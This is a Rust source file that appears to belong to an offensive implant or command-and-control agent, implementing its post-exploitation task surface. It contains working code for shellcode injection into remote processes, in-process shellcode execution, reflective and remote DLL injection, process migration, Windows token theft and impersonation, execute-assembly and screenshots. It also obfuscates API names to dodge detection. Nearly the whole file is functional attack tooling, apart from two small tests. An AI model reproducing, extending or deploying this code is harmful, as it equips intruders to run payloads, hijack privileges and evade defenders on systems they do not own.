//! Post-exploitation task surface: process control, injection, token
//! manipulation, screenshots and in-memory .NET execution.
//!
//! Cross-platform operations (spawn/kill) are implemented directly; the
//! Windows-only operations are exposed with clear failures elsewhere.

#![allow(unsafe_code)]

use crate::TaskOutcome;

#[cfg(windows)]
mod imp {
    use super::*;
    use shikra_evasion::windows;

    /// Holds the current impersonation token handle so it stays alive across
    /// tasks. The safe default is "no impersonation".
    static TOKEN: std::sync::Mutex<Option<usize>> = std::sync::Mutex::new(None);

    pub fn spawn_process(command: &str, args: &[String], hidden: bool) -> TaskOutcome {
        use std::os::windows::process::CommandExt;
        use std::process::{Command, Stdio};

        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        const DETACHED_PROCESS: u32 = 0x0000_0008;

        let mut cmd = Command::new(command);
        cmd.args(args)
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null());
        let flags = if hidden {
            DETACHED_PROCESS | CREATE_NO_WINDOW
        } else {
            0
        };
        cmd.creation_flags(flags);
        match cmd.spawn() {
            Ok(child) => TaskOutcome::ok(format!("spawned pid {}", child.id())),
            Err(err) => TaskOutcome::fail(format!("spawn failed: {err}")),
        }
    }

    pub fn kill_process(pid: u32) -> TaskOutcome {
        unsafe {
            match windows::open_process(pid, 0x0001) {
                // PROCESS_TERMINATE
                Ok(handle) => {
                    let result = windows::terminate_process(handle, 1);
                    let _ = windows::close_handle(handle);
                    match result {
                        Ok(()) => TaskOutcome::ok(format!("terminated pid {pid}")),
                        Err(err) => TaskOutcome::fail(err),
                    }
                }
                Err(err) => TaskOutcome::fail(err),
            }
        }
    }

    pub fn inject(pid: u32, shellcode: &[u8]) -> TaskOutcome {
        unsafe {
            match windows::inject_shellcode(pid, shellcode) {
                Ok(thread) => {
                    let _ = windows::close_handle(thread);
                    TaskOutcome::ok(format!("injected {} bytes into pid {pid}", shellcode.len()))
                }
                Err(err) => TaskOutcome::fail(err),
            }
        }
    }

    pub fn self_exec(shellcode: &[u8]) -> TaskOutcome {
        if shellcode.is_empty() {
            return TaskOutcome::fail("shellcode is empty");
        }
        unsafe {
            let address = match windows::alloc_exec(shellcode.len()) {
                Ok(address) => address,
                Err(err) => return TaskOutcome::fail(err),
            };
            if let Err(err) = windows::write_memory(address, shellcode) {
                return TaskOutcome::fail(err);
            }
            let entry_address = address as usize;
            std::thread::spawn(move || {
                let entry: extern "C" fn() = std::mem::transmute(entry_address);
                entry();
            });
            TaskOutcome::ok(format!(
                "executed {} bytes in-process at 0x{address:x}",
                shellcode.len()
            ))
        }
    }

    pub fn dll_reflect(image: &[u8]) -> TaskOutcome {
        if image.is_empty() {
            return TaskOutcome::fail("DLL image is empty");
        }
        match unsafe { shikra_evasion::reflective::load_dll(image) } {
            Ok((base, result)) => TaskOutcome::ok(format!(
                "reflectively loaded {} bytes at 0x{base:x} (DllMain -> {result})",
                image.len()
            )),
            Err(err) => TaskOutcome::fail(format!("reflective load failed: {err}")),
        }
    }

    pub fn dll_inject(pid: u32, path: &str) -> TaskOutcome {
        unsafe {
            match windows::inject_dll(pid, path) {
                Ok(thread) => {
                    let _ = windows::close_handle(thread);
                    TaskOutcome::ok(format!("injected {path} into pid {pid}"))
                }
                Err(err) => TaskOutcome::fail(err),
            }
        }
    }

    pub fn dll_spawn(path: &str) -> TaskOutcome {
        let child = match std::process::Command::new("notepad.exe").spawn() {
            Ok(child) => child,
            Err(err) => return TaskOutcome::fail(format!("spawn failed: {err}")),
        };
        let pid = child.id();
        drop(child);
        let outcome = dll_inject(pid, path);
        if outcome.exit_code != 0 {
            return outcome;
        }
        TaskOutcome::ok(format!(
            "spawned notepad.exe (pid {pid}) and injected {path}"
        ))
    }

    pub fn spawn_exec(command: Option<&str>, shellcode: &[u8]) -> TaskOutcome {
        let program = command.unwrap_or("notepad.exe");
        let child = match std::process::Command::new(program).spawn() {
            Ok(child) => child,
            Err(err) => return TaskOutcome::fail(format!("spawn failed: {err}")),
        };
        let pid = child.id();
        drop(child);
        let outcome = inject(pid, shellcode);
        if outcome.exit_code != 0 {
            return outcome;
        }
        TaskOutcome::ok(format!(
            "spawned {program} (pid {pid}) and injected {} bytes",
            shellcode.len()
        ))
    }

    pub fn migrate(pid: u32, shellcode: &[u8]) -> TaskOutcome {
        let outcome = inject(pid, shellcode);
        if outcome.exit_code != 0 {
            return outcome;
        }
        TaskOutcome::ok(format!(
            "injected {} bytes into pid {pid}; verify the new payload checks in before terminating this session",
            shellcode.len()
        ))
    }

    pub fn steal_token(pid: u32) -> TaskOutcome {
        unsafe {
            let Some(advapi) = windows::load_library(&obf_advapi()).ok() else {
                return TaskOutcome::fail("advapi32 unavailable");
            };
            let Some(open_token) =
                windows::export_address(advapi, &shikra_obf::obf!("OpenProcessToken"))
            else {
                return TaskOutcome::fail("token open export missing");
            };
            let Some(duplicate) =
                windows::export_address(advapi, &shikra_obf::obf!("DuplicateTokenEx"))
            else {
                return TaskOutcome::fail("token duplicate export missing");
            };
            let Some(impersonate) =
                windows::export_address(advapi, &shikra_obf::obf!("ImpersonateLoggedOnUser"))
            else {
                return TaskOutcome::fail("token impersonation export missing");
            };

            let Ok(process) = windows::open_process(pid, 0x0400) else {
                return TaskOutcome::fail(format!("failed to open pid {pid}"));
            };
            let mut token = 0usize;
            let result = (|| -> Result<(), String> {
                let ok = call_open_process_token(open_token, process, 0x000A, &mut token);
                if ok == 0 || token == 0 {
                    return Err("token open failed".into());
                }
                let mut impersonation = 0usize;
                let ok = call_duplicate_token_ex(
                    duplicate,
                    token,
                    0x0200_0000,
                    0,
                    2, // SecurityImpersonation
                    2, // TokenImpersonation
                    &mut impersonation,
                );
                if ok == 0 || impersonation == 0 {
                    return Err("token duplicate failed".into());
                }
                if call_impersonate(impersonate, impersonation) == 0 {
                    return Err("token impersonation failed".into());
                }
                store_token(impersonation);
                Ok(())
            })();
            let _ = windows::close_handle(token);
            let _ = windows::close_handle(process);
            match result {
                Ok(()) => TaskOutcome::ok(format!("impersonating token from pid {pid}")),
                Err(err) => TaskOutcome::fail(err),
            }
        }
    }

    pub fn make_token(domain: &str, user: &str, password: &str) -> TaskOutcome {
        unsafe {
            let Some(advapi) = windows::load_library(&obf_advapi()).ok() else {
                return TaskOutcome::fail("advapi32 unavailable");
            };
            let Some(logon) = windows::export_address(advapi, &shikra_obf::obf!("LogonUserW"))
            else {
                return TaskOutcome::fail("logon export missing");
            };
            let Some(impersonate) =
                windows::export_address(advapi, &shikra_obf::obf!("ImpersonateLoggedOnUser"))
            else {
                return TaskOutcome::fail("token impersonation export missing");
            };

            let mut user_w = wide(user);
            let mut domain_w = wide(domain);
            let mut password_w = wide(password);
            let mut token = 0usize;
            let ok = call_logon_user(
                logon,
                user_w.as_mut_ptr(),
                domain_w.as_mut_ptr(),
                password_w.as_mut_ptr(),
                2, // LOGON32_LOGON_INTERACTIVE
                0, // LOGON32_PROVIDER_DEFAULT
                &mut token,
            );
            if ok == 0 || token == 0 {
                return TaskOutcome::fail("logon failed");
            }
            if call_impersonate(impersonate, token) == 0 {
                let _ = windows::close_handle(token);
                return TaskOutcome::fail("token impersonation failed");
            }
            store_token(token);
            TaskOutcome::ok(format!("impersonating {domain}\\{user}"))
        }
    }

    pub fn rev2self() -> TaskOutcome {
        unsafe {
            let Some(advapi) = windows::load_library(&obf_advapi()).ok() else {
                return TaskOutcome::fail("advapi32 unavailable");
            };
            let Some(revert) = windows::export_address(advapi, &shikra_obf::obf!("RevertToSelf"))
            else {
                return TaskOutcome::fail("token revert export missing");
            };
            clear_token();
            if call_revert(revert) == 0 {
                return TaskOutcome::fail("token revert failed");
            }
            TaskOutcome::ok("reverted to self")
        }
    }

    pub fn execute_assembly(assembly: &[u8], args: &str) -> TaskOutcome {
        match crate::dotnet::run_assembly(assembly, args) {
            Ok(ret) => TaskOutcome::ok(format!("assembly returned {ret}")),
            Err(err) => TaskOutcome::fail(err),
        }
    }

    pub fn screenshot() -> TaskOutcome {
        crate::screenshot::capture_windows()
    }

    fn obf_advapi() -> String {
        shikra_obf::obf!("advapi32.dll")
    }

    fn wide(value: &str) -> Vec<u16> {
        value.encode_utf16().chain(std::iter::once(0)).collect()
    }

    fn store_token(token: usize) {
        let mut guard = TOKEN.lock().unwrap_or_else(|err| err.into_inner());
        if let Some(previous) = guard.take() {
            let _ = windows::close_handle(previous);
        }
        *guard = Some(token);
    }

    fn clear_token() {
        let mut guard = TOKEN.lock().unwrap_or_else(|err| err.into_inner());
        if let Some(previous) = guard.take() {
            let _ = windows::close_handle(previous);
        }
    }

    type OpenProcessTokenFn = unsafe extern "system" fn(usize, u32, *mut usize) -> i32;
    type DuplicateTokenExFn =
        unsafe extern "system" fn(usize, u32, usize, i32, i32, *mut usize) -> i32;
    type ImpersonateFn = unsafe extern "system" fn(usize) -> i32;
    type LogonUserWFn =
        unsafe extern "system" fn(*mut u16, *mut u16, *mut u16, u32, u32, *mut usize) -> i32;
    type RevertToSelfFn = unsafe extern "system" fn() -> i32;

    unsafe fn call_open_process_token(
        address: usize,
        process: usize,
        access: u32,
        out: *mut usize,
    ) -> i32 {
        let f: OpenProcessTokenFn = core::mem::transmute(address);
        f(process, access, out)
    }

    #[allow(clippy::too_many_arguments)]
    unsafe fn call_duplicate_token_ex(
        address: usize,
        token: usize,
        access: u32,
        attributes: usize,
        impersonation_level: i32,
        token_type: i32,
        out: *mut usize,
    ) -> i32 {
        let f: DuplicateTokenExFn = core::mem::transmute(address);
        f(
            token,
            access,
            attributes,
            impersonation_level,
            token_type,
            out,
        )
    }

    unsafe fn call_impersonate(address: usize, token: usize) -> i32 {
        let f: ImpersonateFn = core::mem::transmute(address);
        f(token)
    }

    #[allow(clippy::too_many_arguments)]
    unsafe fn call_logon_user(
        address: usize,
        user: *mut u16,
        domain: *mut u16,
        password: *mut u16,
        logon_type: u32,
        provider: u32,
        out: *mut usize,
    ) -> i32 {
        let f: LogonUserWFn = core::mem::transmute(address);
        f(user, domain, password, logon_type, provider, out)
    }

    unsafe fn call_revert(address: usize) -> i32 {
        let f: RevertToSelfFn = core::mem::transmute(address);
        f()
    }
}

#[cfg(not(windows))]
mod imp {
    use super::*;

    pub fn spawn_process(command: &str, args: &[String], _hidden: bool) -> TaskOutcome {
        match std::process::Command::new(command).args(args).spawn() {
            Ok(mut child) => {
                let pid = child.id();
                // Reap the child on exit so killed processes do not linger as
                // zombies for the lifetime of the implant.
                std::thread::spawn(move || {
                    let _ = child.wait();
                });
                TaskOutcome::ok(format!("spawned pid {pid}"))
            }
            Err(err) => TaskOutcome::fail(format!("spawn failed: {err}")),
        }
    }

    pub fn kill_process(pid: u32) -> TaskOutcome {
        #[cfg(unix)]
        {
            let rc = unsafe { libc::kill(pid as i32, libc::SIGKILL) };
            if rc == 0 {
                TaskOutcome::ok(format!("terminated pid {pid}"))
            } else {
                TaskOutcome::fail(format!("kill failed: {}", std::io::Error::last_os_error()))
            }
        }
        #[cfg(not(unix))]
        {
            let _ = pid;
            TaskOutcome::fail("kill is unsupported on this platform")
        }
    }

    pub fn inject(_pid: u32, _shellcode: &[u8]) -> TaskOutcome {
        TaskOutcome::fail("process injection is only supported on Windows")
    }

    pub fn migrate(_pid: u32, _shellcode: &[u8]) -> TaskOutcome {
        TaskOutcome::fail("process migration is only supported on Windows")
    }

    pub fn self_exec(shellcode: &[u8]) -> TaskOutcome {
        if shellcode.is_empty() {
            return TaskOutcome::fail("shellcode is empty");
        }
        #[cfg(unix)]
        unsafe {
            let length = shellcode.len();
            let address = libc::mmap(
                std::ptr::null_mut(),
                length,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE | libc::MAP_ANON,
                -1,
                0,
            );
            if address == libc::MAP_FAILED {
                return TaskOutcome::fail(format!(
                    "mmap failed: {}",
                    std::io::Error::last_os_error()
                ));
            }
            std::ptr::copy_nonoverlapping(shellcode.as_ptr(), address as *mut u8, length);
            if libc::mprotect(address, length, libc::PROT_READ | libc::PROT_EXEC) != 0 {
                return TaskOutcome::fail(format!(
                    "mprotect failed: {}",
                    std::io::Error::last_os_error()
                ));
            }
            let entry_address = address as usize;
            std::thread::spawn(move || {
                let entry: extern "C" fn() = std::mem::transmute(entry_address);
                entry();
            });
            TaskOutcome::ok(format!(
                "executed {} bytes in-process at 0x{:x}",
                shellcode.len(),
                address as usize
            ))
        }
        #[cfg(not(unix))]
        {
            TaskOutcome::fail("in-process shellcode execution is unsupported here")
        }
    }

    pub fn spawn_exec(_command: Option<&str>, _shellcode: &[u8]) -> TaskOutcome {
        TaskOutcome::fail("spawn-and-execute is only supported on Windows")
    }

    pub fn dll_inject(_pid: u32, _path: &str) -> TaskOutcome {
        TaskOutcome::fail("DLL injection is only supported on Windows")
    }

    pub fn dll_reflect(_image: &[u8]) -> TaskOutcome {
        TaskOutcome::fail("reflective DLL loading is only supported on Windows")
    }

    pub fn dll_spawn(_path: &str) -> TaskOutcome {
        TaskOutcome::fail("DLL injection is only supported on Windows")
    }

    pub fn steal_token(_pid: u32) -> TaskOutcome {
        TaskOutcome::fail("token operations are only supported on Windows")
    }

    pub fn make_token(_domain: &str, _user: &str, _password: &str) -> TaskOutcome {
        TaskOutcome::fail("token operations are only supported on Windows")
    }

    pub fn rev2self() -> TaskOutcome {
        TaskOutcome::fail("token operations are only supported on Windows")
    }

    pub fn execute_assembly(_assembly: &[u8], _args: &str) -> TaskOutcome {
        TaskOutcome::fail("execute-assembly is only supported on Windows")
    }

    pub fn screenshot() -> TaskOutcome {
        crate::screenshot::capture_unix()
    }
}

pub use imp::{
    dll_inject, dll_reflect, dll_spawn, execute_assembly, inject, kill_process, make_token,
    migrate, rev2self, screenshot, self_exec, spawn_exec, spawn_process, steal_token,
};

#[cfg(test)]
mod tests {
    #[cfg(not(windows))]
    #[test]
    fn windows_only_tasks_fail_clearly() {
        let outcome = super::inject(1, &[0x90]);
        assert_ne!(outcome.exit_code, 0);
        assert!(outcome.stderr.contains("Windows"));

        let outcome = super::steal_token(1);
        assert_ne!(outcome.exit_code, 0);

        let outcome = super::make_token("d", "u", "p");
        assert_ne!(outcome.exit_code, 0);

        let outcome = super::execute_assembly(&[0x00], "{}");
        assert_ne!(outcome.exit_code, 0);
    }

    #[cfg(unix)]
    #[test]
    fn spawn_and_kill_roundtrip() {
        let outcome = super::spawn_process("/bin/sleep", &["5".to_string()], true);
        assert_eq!(outcome.exit_code, 0, "{}", outcome.stderr);
        let stdout = String::from_utf8_lossy(&outcome.stdout);
        let pid: u32 = stdout
            .trim()
            .trim_start_matches("spawned pid ")
            .parse()
            .expect("pid");
        let kill = super::kill_process(pid);
        assert_eq!(kill.exit_code, 0, "{}", kill.stderr);
        // The reaper thread waits on the child; poll until the pid is gone.
        let mut gone = false;
        for _ in 0..50 {
            std::thread::sleep(std::time::Duration::from_millis(20));
            if unsafe { libc::kill(pid as i32, 0) } == -1 {
                gone = true;
                break;
            }
        }
        assert!(gone, "process {pid} was not reaped after kill");
    }
}
